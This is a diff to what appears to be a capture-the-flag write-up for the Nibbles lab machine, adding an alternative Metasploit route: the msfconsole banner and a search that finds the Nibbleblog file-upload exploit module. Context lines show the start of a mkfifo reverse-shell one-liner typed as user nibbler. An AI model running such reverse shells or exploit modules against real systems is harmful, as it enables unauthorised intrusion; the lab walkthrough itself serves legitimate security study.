@@ -1320,3 +1320,44 @@ drwxr-xr-x 14 root root 4096 Dec 10  2017 ..
 nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f
 <er/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f                 
 > ^[[A^[[A^X^C
+```
+
+Alt method:
+
+cfsdexpo@CFSDTerm:~ » msfconsole
+Metasploit tip: Search can apply complex filters such as search cve:2009 
+type:exploit, see all the filters with help search
+                                                  
+                                   ____________
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
+ [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
+ [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
+ [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+
+
+       =[ metasploit v6.4.104-dev                               ]
++ -- --=[ 2,587 exploits - 1,319 auxiliary - 1,667 payloads     ]
++ -- --=[ 433 post - 49 encoders - 14 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > search nibbleblog
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank       Check  Description
+   -  ----                                       ---------------  ----       -----  -----------
+   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
+
+msf > 
